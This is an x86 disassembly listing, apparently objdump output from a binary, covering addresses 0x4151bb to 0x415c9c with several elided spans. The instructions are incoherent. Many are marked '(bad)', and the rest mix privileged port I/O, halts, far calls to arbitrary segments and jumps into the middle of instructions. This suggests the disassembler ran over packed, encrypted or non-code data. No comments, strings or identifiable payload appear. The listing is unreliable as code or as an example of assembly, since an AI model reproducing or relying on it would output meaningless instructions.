  4151bb:	xor    DWORD PTR [ebp+0x1f],esi
  4151be:	ret    
  4151bf:	and    eax,0x1d42ea36
  4151c4:	add    eax,0xaa97f2ad
  4151c9:	cmp    DWORD PTR [edi+0x5b88de8f],edi
  4151cf:	xchg   ecx,eax
  4151d0:	inc    ebp
  4151d1:	mov    ebx,0x70729713
  4151d6:	hlt    
  4151d7:	add    BYTE PTR [eax+esi*1],dh
  4151da:	daa    
  4151db:	fmul   DWORD PTR [edx]
  4151dd:	arpl   WORD PTR [ebx+0x16],bp
  4151e0:	mov    eax,ds:0x5472b055
  4151e5:	test   eax,0x70c95999
  4151ea:	xchg   edx,eax
  4151eb:	cmp    eax,ebp
  4151ed:	enter  0x646e,0x89
  4151f1:	and    dh,BYTE PTR [eax+ebp*4]
  4151f4:	sbb    al,0x8b
  4151f6:	int    0x89
  4151f8:	xor    eax,0x4a088c2
  4151fd:	adc    BYTE PTR [ecx-0x7ffd2d5f],0xbd
  415204:	mov    al,ds:0x7173c43
  415209:	xchg   ebx,eax
  41520a:	pop    eax
  41520b:	mov    eax,0xe8884bdd
  415210:	fstp   st(0)
  415212:	sub    DWORD PTR [ebp-0x54e2f420],esp
  415218:	jge    0x415254
  41521a:	mov    esp,0x1c1b73f8
  41521f:	arpl   WORD PTR ss:[esi-0x50702255],ax
  415226:	imul   esi,DWORD PTR [ecx-0x43f1771b],0xcd66287a
  415230:	sbb    cl,BYTE PTR [edx+0x6e]
  415233:	fnstenv [edi+0x1b]
  415236:	fsub   QWORD PTR ds:0x523396a5
  41523c:	mov    eax,ds:0x61e9595a
	...
  4152b1:	add    BYTE PTR [eax],al
  4152b3:	add    BYTE PTR [ecx],al
  4152b5:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4152bc:	stos   BYTE PTR es:[edi],al
  4152bd:	dec    edx
  4152be:	out    0x6e,al
  4152c0:	aaa    
  4152c1:	lahf   
  4152c2:	jp     0x4152a6
  4152c4:	imul   ebp,eax,0x0
  4152c7:	add    ch,dh
  4152c9:	add    BYTE PTR [eax],al
  4152cb:	add    BYTE PTR [edi+0x6f],cl
  4152ce:	scas   eax,DWORD PTR es:[edi]
  4152cf:	mov    eax,0xc0627064
  4152d4:	jmp    0x4152ea
  4152d6:	xchg   edx,eax
  4152d7:	mov    ecx,0xec4c99d0
  4152dc:	(bad)  
  4152dd:	mov    edx,0x9fdcd364
  4152e2:	sub    ecx,DWORD PTR [eax+ebp*2]
  4152e5:	fdiv   QWORD PTR [edi+edx*8]
  4152e8:	add    al,0xc4
  4152ea:	xchg   DWORD PTR [eax+0x4d786810],ebx
  4152f0:	push   ebx
  4152f1:	xchg   ebp,eax
  4152f2:	and    DWORD PTR [ecx-0x7f94eeec],edi
  4152f8:	repz imul eax,DWORD PTR [eax],0x5c
  4152fc:	idiv   BYTE PTR [edi-0x7f]
  4152ff:	mov    bh,0x1b
  415301:	lock int 0xbc
  415304:	cdq    
  415305:	inc    edx
  415306:	fwait
  415307:	jle    0x4152ac
  415309:	imul   edx,DWORD PTR [ebp-0x5b6cf2a8],0xffffffbf
  415310:	test   eax,0x5c5a6f01
  415315:	jecxz  0x41531a
  415317:	xchg   esi,eax
  415318:	xchg   ebx,eax
  415319:	aad    0x3f
  41531b:	push   ebp
  41531c:	rol    DWORD PTR [esi],1
  41531e:	ficom  DWORD PTR [eax+0x33]
  415321:	push   esp
  415322:	sbb    eax,DWORD PTR [esi-0x2b9dfdeb]
  415328:	adc    ecx,edx
  41532a:	mov    bl,0x73
  41532c:	xchg   ebp,edx
  41532e:	scas   eax,DWORD PTR es:[edi]
  41532f:	and    dh,0x8a
  415332:	jo     0x4152f8
  415334:	xor    edx,DWORD PTR [esi-0x6a]
  415337:	scas   eax,DWORD PTR es:[edi]
  415338:	adc    al,0x3
  41533a:	sbb    eax,0x7bd14875
  41533f:	or     bh,BYTE PTR [ebx-0x60]
  415342:	popf   
  415343:	mov    al,ds:0x9524781b
  415348:	fild   DWORD PTR [edi-0x7b]
  41534b:	stos   DWORD PTR es:[edi],eax
  41534c:	in     eax,0x77
  41534e:	les    ebx,FWORD PTR [esi+0x7c]
  415351:	cmp    al,ah
  415353:	aad    0x1f
  415355:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415356:	mov    bh,0x69
  415358:	or     esp,DWORD PTR [ecx+0x10207357]
  41535e:	or     eax,0x60bb3e24
  415363:	ja     0x415362
  415365:	shl    DWORD PTR [ebp+0x5fd302e4],1
  41536b:	leave  
  41536c:	or     DWORD PTR ds:0xc0133374,edi
  415372:	mov    edi,0xd5b2710e
  415377:	fstp   st(3)
  415379:	(bad)  
  41537a:	or     eax,0xe59ff1bd
  41537f:	mov    ds:0xd27d2d93,eax
  415384:	inc    ebx
  415385:	sub    esi,DWORD PTR [edx]
  415387:	retf   0x8ca2
  41538a:	or     al,0x40
  41538c:	mov    ecx,0xe69c38c8
  415391:	and    eax,0xaeb904d5
  415396:	inc    ebx
  415397:	fst    DWORD PTR [edx+0x3f]
  41539a:	jge    0x4153e6
  41539c:	mov    ebx,0x36710711
  4153a1:	add    al,0xc3
  4153a3:	(bad)  
  4153a4:	dec    ebx
  4153a5:	push   edi
  4153a6:	pop    eax
  4153a7:	call   0x5fbe:0xf4be5b3c
  4153ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153af:	loopne 0x4153bb
  4153b1:	or     al,0x89
  4153b3:	jp     0x41535c
  4153b5:	enter  0x74cb,0x9a
  4153b9:	fmul   DWORD PTR [edi]
  4153bb:	daa    
  4153bc:	imul   ebp,DWORD PTR [ebx-0x5e],0xffffffce
  4153c0:	xchg   edx,eax
	...
  415431:	add    BYTE PTR [eax],al
  415433:	add    BYTE PTR [ebx+0x73],bl
  415436:	inc    edx
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	xchg   DWORD PTR [edx-0x169f8095],ecx
  415446:	add    BYTE PTR [eax],al
  415448:	cmc    
  415449:	add    BYTE PTR [eax],al
  41544b:	add    BYTE PTR [ebp+0x7c62f08b],cl
  415451:	shl    edi,1
  415453:	mov    bl,0xf6
  415455:	add    BYTE PTR [ebx+0x31969139],bl
  41545b:	popf   
  41545c:	mov    ebx,0x578bceea
  415461:	into   
  415462:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415463:	mov    bh,0x75
  415465:	rcr    DWORD PTR [edx-0x5f1d9ae7],1
  41546b:	ret    
  41546c:	div    BYTE PTR [edx]
  41546e:	pop    es
  41546f:	mov    ch,0xc0
  415471:	pop    ds
  415472:	jmp    0x415457
  415474:	xchg   esi,eax
  415475:	sub    al,0xbd
  415477:	mov    BYTE PTR [ebx-0x65],ah
  41547a:	fnsave [ebp-0x6b]
  41547d:	inc    esi
  41547e:	mov    BYTE PTR [esi-0x76],ch
  415481:	addr16 push ebp
  415483:	jne    0x4154c4
  415485:	push   edx
  415486:	cmp    al,0x7e
  415488:	popf   
  415489:	test   ecx,0xa10a543f
  41548f:	not    ah
  415491:	dec    esp
  415492:	(bad)  
  415493:	jnp    0x41544c
  415495:	pop    ebx
  415496:	jecxz  0x415440
  415498:	inc    eax
  415499:	bound  esi,QWORD PTR [ecx+0x32bcb6ee]
  41549f:	test   al,0x35
  4154a1:	scas   eax,DWORD PTR es:[edi]
  4154a2:	dec    esp
  4154a3:	loopne 0x41549c
  4154a5:	lods   al,BYTE PTR ds:[esi]
  4154a6:	mov    ecx,0x89293eaf
  4154ab:	and    BYTE PTR [edi],0xe5
  4154ae:	or     BYTE PTR [ebp+0x261a5043],0xe6
  4154b5:	sub    DWORD PTR [ebx-0x72328cea],edx
  4154bb:	push   0xffffff90
  4154bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4154be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154bf:	mov    ch,0x59
  4154c1:	ret    
  4154c2:	or     al,0xe7
  4154c4:	mov    eax,ds:0x1e5f42e5
  4154c9:	repnz lahf 
  4154cb:	and    BYTE PTR [esi-0x5c32edc8],0x2d
  4154d2:	cmp    al,0x4c
  4154d4:	pop    esi
  4154d5:	cld    
  4154d6:	or     eax,0x6df8a2ac
  4154db:	shr    BYTE PTR [edi],0x35
  4154de:	sub    bh,BYTE PTR [esi-0x7711d540]
  4154e4:	enter  0x11a5,0x29
  4154e8:	icebp  
  4154e9:	int    0x23
  4154eb:	es lock push ss
  4154ee:	dec    ecx
  4154ef:	ror    DWORD PTR [eax+0x36bfb96b],cl
  4154f5:	outs   dx,DWORD PTR ds:[esi]
  4154f6:	lds    edx,FWORD PTR [ebp-0x75c4fb15]
  4154fc:	cli    
  4154fd:	lds    ecx,FWORD PTR [esi+edx*1]
  415500:	mov    bl,0x25
  415502:	xor    esi,ecx
  415504:	add    eax,0x543e6d33
  415509:	mov    ds:0x3b850960,eax
  41550e:	push   ebp
  41550f:	imul   esp,DWORD PTR [esi-0x23bc2d06],0x5a4fd6ff
  415519:	pop    ebx
  41551a:	outs   dx,DWORD PTR ds:[esi]
  41551b:	pusha  
  41551c:	clc    
  41551d:	lock outs dx,BYTE PTR ds:[esi]
  41551f:	push   ecx
  415520:	in     al,dx
  415521:	pop    ecx
  415522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415523:	pop    ebp
  415524:	inc    ebx
  415525:	aad    0x2
  415527:	cli    
  415528:	(bad)  
  415529:	ss mov ecx,0x16ed4657
  41552f:	sub    al,0x7a
  415531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415532:	xchg   ebp,eax
  415533:	cmp    eax,0xe9eb908d
  415538:	test   eax,0x4a7711e6
  41553d:	sbb    edi,DWORD PTR [eax+ebp*1+0x58]
	...
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	push   ss
  4155c1:	mov    dh,ah
  4155c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155c4:	push   ebp
  4155c5:	jmp    0x0:0xf50000
  4155cc:	aaa    
  4155cd:	popa   
  4155ce:	cmp    BYTE PTR [edx],bl
  4155d0:	sbb    dl,cl
  4155d2:	push   0x3d
  4155d4:	aam    0x59
  4155d6:	hlt    
  4155d7:	rep outs dx,DWORD PTR ds:[esi]
  4155d9:	mov    esp,fs
  4155db:	ret    0x18e6
  4155de:	dec    esp
  4155df:	(bad)  
  4155e0:	popf   
  4155e1:	mov    ecx,0xfc8c8269
  4155e6:	xchg   edx,eax
  4155e7:	mov    ecx,0xc23a9daf
  4155ec:	enter  0xdb19,0x61
  4155f0:	sbb    ebp,DWORD PTR [ecx-0x7520c180]
  4155f6:	and    DWORD PTR [edx+edi*8],ebx
  4155f9:	sbb    ecx,esi
  4155fb:	cmp    eax,0xb8bf14e2
  415600:	or     ah,bh
  415602:	sbb    al,0x73
  415604:	repnz cli 
  415606:	add    bl,BYTE PTR [edi+ebx*2]
  415609:	mov    edi,0xcab948f9
  41560e:	and    ah,ah
  415610:	adc    cl,al
  415612:	add    ecx,DWORD PTR [eax]
  415614:	xchg   esp,eax
  415615:	jbe    0x41565b
  415617:	push   ebx
  415618:	dec    ecx
  415619:	mov    edx,0x5f85598
  41561e:	pop    eax
  41561f:	jbe    0x415622
  415621:	xor    dh,BYTE PTR [edi+ebx*1]
  415624:	imul   edx,ecx,0x97544ba8
  41562a:	rcr    DWORD PTR [edi+0x5a4986e0],0x8a
  415631:	xchg   esp,eax
  415633:	add    edx,ebp
  415635:	mov    al,ds:0x9e069e37
  41563a:	outs   dx,DWORD PTR ds:[esi]
  41563b:	das    
  41563c:	dec    edx
  41563d:	adc    al,0xbe
  41563f:	mov    bl,BYTE PTR [ebp-0x15]
  415642:	pushf  
  415643:	ss into 
  415645:	cdq    
  415646:	pushf  
  415647:	test   eax,0xa11ed88d
  41564c:	jns    0x41565c
  41564e:	push   eax
  41564f:	ficom  DWORD PTR [edi+0x4]
  415652:	test   eax,0x96344110
  415657:	pop    es
  415658:	sbb    al,0x86
  41565a:	mov    cl,0x5e
  41565c:	popa   
  41565d:	or     BYTE PTR [edx-0x2e],cl
  415660:	jno    0x41568d
  415662:	push   ebp
  415663:	inc    ebx
  415664:	add    BYTE PTR [ebx-0x15],bh
  415667:	jecxz  0x4156d5
  415669:	in     al,dx
  41566a:	xchg   bl,ch
  41566c:	ins    DWORD PTR es:[edi],dx
  41566d:	fldenv ds:0xba7f5131
  415673:	scas   eax,DWORD PTR es:[edi]
  415674:	cmp    edi,DWORD PTR [eax+ecx*4]
  415677:	fmul   DWORD PTR [esi]
  415679:	xlat   BYTE PTR ds:[ebx]
  41567a:	cmp    eax,0xdfb4a202
  41567f:	sub    al,bl
  415681:	out    0x5a,eax
  415683:	xchg   edi,eax
  415684:	mov    ebp,0xebfea9e
  415689:	fidiv  WORD PTR [esi]
  41568b:	js     0x41567a
  41568d:	sub    DWORD PTR [ebx+0x860e50f],ebp
  415693:	dec    bp
  415695:	addr16 jmp 0x51786de7
  41569b:	pop    edi
  41569c:	ja     0x4156f6
  41569e:	loope  0x41565e
  4156a0:	or     eax,0x8e42ee36
  4156a5:	out    0x40,al
  4156a7:	sub    al,BYTE PTR [ebx+0x44]
  4156aa:	iret   
  4156ab:	push   ebx
  4156ac:	mov    bl,0x80
  4156ae:	shl    DWORD PTR [ebx],cl
  4156b0:	xchg   edi,eax
  4156b1:	or     esp,DWORD PTR [eax-0x7d]
  4156b4:	or     al,0x13
  4156b6:	test   DWORD PTR [ecx+esi*2+0x77398815],esp
  4156bd:	mov    DWORD PTR [edx+0xb231],esp
	...
  415733:	add    BYTE PTR [esi+0x2f],bh
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0x55753ed3
  415743:	push   ds
  415744:	dec    edx
  415745:	jmp    0x415747
  415747:	add    ch,dh
  415749:	add    BYTE PTR [eax],al
  41574b:	add    BYTE PTR [ecx],ah
  41574d:	xchg   ebp,eax
  41574e:	and    ebp,ebp
  415750:	fnstenv [ebx]
  415752:	repz push edx
  415754:	cmp    eax,0xf243c6de
  415759:	(bad)  
  41575a:	cmp    esp,DWORD PTR [eax+0x25ca42ff]
  415760:	lea    edx,[esi+esi*1+0x21]
  415764:	stos   DWORD PTR es:[edi],eax
  415765:	ds aas 
  415767:	mov    ds:0x11412f4e,al
  41576c:	sub    esp,DWORD PTR [esp-0x2a]
  415770:	scas   al,BYTE PTR es:[edi]
  415771:	nop
  415772:	mov    esp,0x14370ea1
  415777:	cmp    eax,0x546a7d77
  41577c:	ret    
  41577d:	xchg   esi,eax
  41577e:	or     esp,eax
  415780:	push   esp
  415781:	shl    ebx,0xd7
  415784:	pushf  
  415785:	mov    bl,0x1e
  415787:	das    
  415788:	das    
  415789:	loopne 0x415764
  41578b:	mov    bh,0x65
  41578d:	pop    ss
  41578e:	scas   al,BYTE PTR es:[edi]
  41578f:	or     DWORD PTR [eax-0x7e],0x35
  415793:	cmp    BYTE PTR [esi+0x7adf3e24],dh
  415799:	fcomp  DWORD PTR [ebx]
  41579b:	mov    dl,0x6b
  41579d:	scas   eax,DWORD PTR es:[edi]
  41579e:	xor    DWORD PTR [edi-0x23],esp
  4157a1:	lods   eax,DWORD PTR ds:[esi]
  4157a2:	neg    esi
  4157a4:	in     al,0x50
  4157a6:	outs   dx,DWORD PTR ds:[esi]
  4157a7:	mov    ds:0xe20006d3,al
  4157ac:	ja     0x41582a
  4157ae:	inc    esp
  4157af:	out    0x57,eax
  4157b1:	jo     0x4157e8
  4157b3:	icebp  
  4157b4:	and    DWORD PTR [eax+0x1c],0xffffffe6
  4157b8:	fst    QWORD PTR [ebx]
  4157ba:	jle    0x41574b
  4157bc:	hlt    
  4157bd:	es dec esi
  4157bf:	or     BYTE PTR [ebx-0x5f],al
  4157c2:	sub    eax,0x3d01cb65
  4157c7:	ins    BYTE PTR es:[edi],dx
  4157c8:	xor    ecx,ebp
  4157ca:	not    BYTE PTR [edi]
  4157cc:	xchg   ecx,eax
  4157cd:	int3   
  4157ce:	out    0xa,eax
  4157d0:	pop    edi
  4157d1:	aaa    
  4157d2:	pop    edi
  4157d3:	mov    ebp,0x30834769
  4157d8:	fidivr DWORD PTR [ebx-0x23]
  4157db:	sbb    BYTE PTR [edi+eiz*8+0x46],ch
  4157df:	fbld   TBYTE PTR [edi]
  4157e1:	push   esp
  4157e2:	out    dx,eax
  4157e3:	mov    cs,WORD PTR [edi-0x2f0df2a1]
  4157e9:	mov    eax,0x89b2e973
  4157ee:	leave  
  4157ef:	shl    DWORD PTR [edi],1
  4157f1:	aad    0x83
  4157f3:	out    0x3f,al
  4157f5:	inc    eax
  4157f6:	and    eax,0xad579bf
  4157fb:	cmc    
  4157fc:	mov    al,BYTE PTR [eax]
  4157fe:	hlt    
  4157ff:	inc    esp
  415800:	outs   dx,BYTE PTR ds:[esi]
  415801:	mov    cl,0x79
  415803:	cwde   
  415804:	fsub   QWORD PTR [edx-0x28a46030]
  41580a:	addr16 sahf 
  41580c:	imul   ecx,esp,0x680c7563
  415812:	(bad)  
  415813:	lock cmp dh,BYTE PTR [ecx]
  415816:	jnp    0x415860
  415818:	mov    WORD PTR [ecx+0x6f],ds
  41581b:	cmp    ebx,DWORD PTR [edx+0x11]
  41581e:	pop    esp
  41581f:	pop    ebp
  415820:	or     BYTE PTR [esi-0x15cbab76],bh
  415826:	rcr    ecx,0x5a
  415829:	mov    al,0xa5
  41582b:	jns    0x415805
  41582d:	lea    edi,[eax]
  41582f:	inc    ecx
  415830:	xor    BYTE PTR [esi],0x79
  415833:	aaa    
  415834:	stos   DWORD PTR es:[edi],eax
  415835:	ret    0xda41
  415838:	test   BYTE PTR [ebp-0x70b6011a],bl
  41583e:	dec    eax
  41583f:	outs   dx,BYTE PTR ds:[esi]
  415840:	fild   WORD PTR [eax]
	...
  4158b2:	add    BYTE PTR [eax],al
  4158b4:	or     edi,DWORD PTR [esi-0x2e]
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0x47ae18fe
  4158c3:	test   BYTE PTR [edi],bh
  4158c5:	in     al,dx
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	cmc    
  4158c9:	add    BYTE PTR [eax],al
  4158cb:	add    dl,cl
  4158cd:	sub    ebp,DWORD PTR [edi+0xc80f486]
  4158d3:	stos   DWORD PTR es:[edi],eax
  4158d4:	ror    bl,1
  4158d6:	(bad)  
  4158d7:	sub    DWORD PTR [eax],edx
  4158d9:	icebp  
  4158da:	or     BYTE PTR [esi+0x5f],bh
  4158dd:	and    esi,DWORD PTR [eax+eiz*8+0x1f]
  4158e1:	xlat   BYTE PTR ds:[ebx]
  4158e2:	loop   0x4158ac
  4158e4:	mov    bl,0xf9
  4158e6:	int    0x20
  4158e8:	and    al,0xd
  4158ea:	dec    edx
  4158eb:	xor    DWORD PTR [ecx+0x57],0xe5f82e61
  4158f2:	(bad)  
  4158f3:	pop    esp
  4158f4:	jnp    0x4158df
  4158f6:	leave  
  4158f7:	lods   eax,DWORD PTR ds:[esi]
  4158f8:	retf   0xc586
  4158fb:	loopne 0x415950
  4158fd:	dec    edx
  4158fe:	aam    0xbf
  415900:	sbb    BYTE PTR [edi],dl
  415902:	call   0xa17c:0x600adbf
  415909:	imul   edx,DWORD PTR [esi+esi*2],0xffffffed
  41590d:	adc    edx,DWORD PTR [edi]
  41590f:	lea    ebp,[ebx]
  415911:	daa    
  415912:	xor    DWORD PTR [eax+0xc7ca781],0xfffffff8
  415919:	js     0x4158c5
  41591b:	add    ebp,DWORD PTR [esi-0xfd3d3c7]
  415921:	std    
  415922:	pop    es
  415923:	mov    al,ds:0x375b0015
  415928:	sbb    ecx,DWORD PTR [ebx+0x70e0eaf1]
  41592e:	push   0xd3cbe38d
  415933:	dec    esi
  415934:	jb     0x41598c
  415936:	aad    0x6f
  415938:	repz loope 0x4158bf
  41593b:	test   eax,0xfaf7b02e
  415940:	out    dx,eax
  415941:	jne    0x415958
  415943:	bound  esp,QWORD PTR [eax]
  415945:	imul   edi,ebp,0xfffffff8
  415948:	ins    BYTE PTR es:[edi],dx
  415949:	in     al,dx
  41594a:	cs aam 0x26
  41594d:	push   ebx
  41594e:	or     al,0x61
  415950:	clc    
  415951:	add    DWORD PTR [eax+0x4d8be4fb],ebp
  415957:	cmp    BYTE PTR [eax-0xc],ch
  41595a:	sbb    DWORD PTR [ecx],edx
  41595c:	js     0x41598e
  41595e:	sbb    eax,DWORD PTR [edx+0x76]
  415961:	shl    BYTE PTR [esi],cl
  415963:	mov    cl,0x8a
  415965:	add    eax,0x275a3360
  41596a:	dec    DWORD PTR [esi]
  41596c:	jo     0x4159eb
  41596e:	or     DWORD PTR [ecx-0x72d58edb],edi
  415974:	mov    edi,0x868721c6
  415979:	xor    BYTE PTR [eax],dl
  41597b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41597c:	ror    DWORD PTR [edi],cl
  41597e:	mov    ds:0xa3cb6df2,eax
  415983:	mov    BYTE PTR [ecx+0x54180136],bl
  415989:	stos   DWORD PTR es:[edi],eax
  41598a:	stc    
  41598b:	mov    ebp,0xe546d29e
  415990:	push   ds
  415991:	ds jg  0x415920
  415994:	idiv   DWORD PTR [edx-0x12]
  415997:	or     eax,DWORD PTR [eax+0x5d58bea7]
  41599d:	mov    ds:0x88422b88,al
  4159a2:	jbe    0x415961
  4159a4:	xor    eax,0xc087a22e
  4159aa:	jle    0x4159a0
  4159ac:	jae    0x415a02
  4159ae:	mov    cl,0xf4
  4159b0:	cld    
  4159b1:	lds    eax,FWORD PTR [edx+0x6a2d90a3]
  4159b7:	push   0x1f785fd8
  4159bc:	into   
  4159bd:	and    al,BYTE PTR [edi+0x28af]
	...
  415a33:	add    BYTE PTR [edi+0x7e363ed9],bl
  415a39:	neg    DWORD PTR [edi+0x4f7241f9]
  415a3f:	lahf   
  415a40:	ret    0xfdad
  415a43:	and    esi,DWORD PTR [ebp*8+0xf50000]
  415a4a:	add    BYTE PTR [eax],al
  415a4c:	fwait
  415a4d:	rcr    DWORD PTR ds:0x1f7d6d69,1
  415a53:	pop    eax
  415a55:	cli    
  415a56:	jecxz  0x4159f7
  415a58:	dec    ebp
  415a59:	sbb    dl,0x17
  415a5c:	xor    ecx,ebx
  415a5e:	test   al,0xe9
  415a60:	sahf   
  415a61:	and    BYTE PTR [edi-0x74edd964],dh
  415a67:	add    BYTE PTR [eax-0x45],cl
  415a6a:	lock repz inc edx
  415a6d:	mov    ss,WORD PTR [ecx]
  415a6f:	cmp    eax,0xdbae17f7
  415a74:	mov    ebp,0xc826c87b
  415a79:	adc    ecx,DWORD PTR [ecx+ebp*2]
  415a7c:	stc    
  415a7d:	cwde   
  415a7e:	inc    edx
  415a7f:	mov    WORD PTR [eax-0x31],fs
  415a82:	(bad)  
  415a83:	in     al,dx
  415a84:	cli    
  415a85:	lods   eax,DWORD PTR ds:[esi]
  415a86:	fwait
  415a87:	and    edi,DWORD PTR [edi-0x7629de16]
  415a8d:	mov    ch,0xcf
  415a8f:	xchg   ebx,eax
  415a90:	fistp  QWORD PTR ds:0x7c7ed537
  415a96:	and    BYTE PTR [ebp-0xa97ba10],ah
  415a9c:	or     ch,dl
  415a9e:	sub    al,0xd7
  415aa0:	shl    DWORD PTR [ecx-0x47],0x4d
  415aa4:	mov    al,ds:0xdf2f4086
  415aa9:	(bad)  
  415aaa:	es pop ss
  415aac:	aad    0xb0
  415aae:	into   
  415aaf:	(bad)  
  415ab0:	pop    ss
  415ab1:	popa   
  415ab2:	mov    eax,0xf5546dd0
  415ab7:	pop    edx
  415ab8:	enter  0x9014,0x66
  415abc:	(bad)  
  415abd:	repnz mov BYTE PTR [ecx-0x52dd6404],ah
  415ac4:	sub    DWORD PTR [edi+0x6d],esi
  415ac7:	pop    edx
  415ac8:	xchg   edx,eax
  415ac9:	jne    0x415a71
  415acb:	mov    ebp,0xff102e46
  415ad0:	jmp    FWORD PTR [eax-0x2a2ecb50]
  415ad6:	mov    ebp,0x80880ffe
  415adb:	(bad)  
  415adc:	out    dx,eax
  415add:	fwait
  415ade:	xor    BYTE PTR [ebp-0x2b6de889],bh
  415ae4:	adc    al,cl
  415ae6:	cmp    DWORD PTR [eax-0x212c4f29],eax
  415aec:	aaa    
  415aed:	add    BYTE PTR [edx],bh
  415aef:	push   0xaa4bf9e1
  415af4:	push   edi
  415af5:	push   0x10
  415af7:	outs   dx,BYTE PTR ds:[esi]
  415af8:	hlt    
  415af9:	xchg   bl,dh
  415afb:	ins    BYTE PTR es:[edi],dx
  415afc:	xchg   cl,dl
  415afe:	call   0x8e64b482
  415b03:	or     esp,eax
  415b05:	pop    ebx
  415b06:	add    DWORD PTR [eax],esi
  415b08:	xchg   edx,eax
  415b09:	shl    BYTE PTR [ebp+0x69],0xb9
  415b0d:	mov    ecx,0xc271e751
  415b12:	mov    al,0xc5
  415b14:	cmp    al,0xbb
  415b16:	fdivr  QWORD PTR [eax+0x3e]
  415b19:	adc    eax,0x27d9026c
  415b1e:	rol    BYTE PTR [ebp-0x5],cl
  415b21:	pop    edx
  415b22:	adc    DWORD PTR [ecx],esi
  415b24:	pop    edx
  415b25:	call   FWORD PTR [eax+ebp*1+0x54]
  415b29:	mov    edi,0xb5063fb5
  415b2e:	call   DWORD PTR [ebp+edx*2-0x1]
  415b32:	test   edx,0xd683b8b4
  415b38:	dec    eax
  415b39:	daa    
  415b3a:	call   0x6d7cf246
  415b3f:	cld    
  415b40:	and    eax,DWORD PTR [eax]
	...
  415bb2:	add    BYTE PTR [eax],al
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	xchg   ebx,eax
  415bc1:	loop   0x415c1e
  415bc3:	push   0xee29
  415bc8:	cmc    
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [ecx-0x43],bl
  415bce:	xchg   edi,eax
  415bcf:	inc    edi
  415bd0:	out    dx,eax
  415bd1:	(bad)  
  415bd3:	sub    BYTE PTR ds:0xbe95cf6a,al
  415bd9:	sub    BYTE PTR [ebp+0x7d],dh
  415bdc:	mov    ecx,0x3ed1e4d3
  415be1:	aaa    
  415be2:	pop    ebx
  415be3:	mov    dh,0x94
  415be5:	xlat   BYTE PTR ds:[ebx]
  415be6:	lds    esi,FWORD PTR ds:0x13038a0e
  415bec:	cli    
  415bed:	test   eax,0x4beff9
  415bf2:	sub    al,0xf4
  415bf4:	adc    ebx,DWORD PTR [esi-0xc4224d1]
  415bfa:	dec    edx
  415bfb:	pushf  
  415bfc:	mov    eax,ds:0x1db1bdf1
  415c01:	and    ebp,DWORD PTR [edx-0x9]
  415c04:	test   al,0xe
  415c06:	inc    edx
  415c07:	sub    bh,ah
  415c09:	mov    ah,0xe0
  415c0b:	mov    bl,BYTE PTR [eax-0x1d]
  415c0e:	push   ss
  415c0f:	xchg   DWORD PTR [eax+0x66006b5a],ebx
  415c15:	mov    edx,DWORD PTR [edx-0x6e]
  415c18:	inc    ebx
  415c19:	les    ebx,FWORD PTR [ebx-0x59]
  415c1c:	maxps  xmm2,XMMWORD PTR [eax+0x52]
  415c20:	gs call 0x2c7dbe20
  415c26:	xchg   ebx,eax
  415c27:	sub    ecx,DWORD PTR [ecx-0x31]
  415c2a:	popf   
  415c2b:	xchg   BYTE PTR [eax],al
  415c2d:	mov    ah,0x63
  415c2f:	jnp    0x415bc9
  415c31:	les    eax,FWORD PTR [ecx+0x37]
  415c34:	xlat   BYTE PTR ds:[ebx]
  415c35:	in     al,0x3f
  415c37:	repz mov ch,0xb
  415c3a:	push   edx
  415c3b:	push   edi
  415c3c:	shl    ch,cl
  415c3e:	test   DWORD PTR [esi+ecx*8-0x10547cf4],edx
  415c45:	push   0x2b
  415c47:	jno    0x415c91
  415c49:	loope  0x415bcc
  415c4b:	push   ds
  415c4c:	or     ah,BYTE PTR [ebx]
  415c4e:	hlt    
  415c4f:	addr16 jge 0x415c63
  415c52:	mov    bh,0x9b
  415c54:	cmp    bh,BYTE PTR [ebx+ebp*4]
  415c57:	jle    0x415c11
  415c59:	add    BYTE PTR [ebp+0x78],0x46
  415c5d:	mov    gs,WORD PTR [ecx-0x6f504a49]
  415c63:	mov    ebp,0xa23505bf
  415c68:	(bad)  
  415c69:	es mov ecx,0xf07f8e1e
  415c6f:	mov    ?,WORD PTR [esi-0x41]
  415c72:	test   DWORD PTR [ebp+0x2a0a4ed2],edi
  415c78:	mov    fs,ebx
  415c7a:	loopne 0x415c32
  415c7c:	jo     0x415c48
  415c7e:	rol    DWORD PTR [edx],1
  415c80:	lahf   
  415c81:	leave  
  415c82:	push   0x507c2b9
  415c87:	call   0x3c26532
  415c8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c8d:	xor    cl,dl
  415c8f:	ret    0x9689
  415c92:	add    BYTE PTR [ebp+0x1e],ch
  415c95:	lods   al,BYTE PTR ds:[esi]
  415c96:	aaa    
  415c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c98:	and    al,0x7d
  415c9a:	jg     0x415c8b
  415c9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
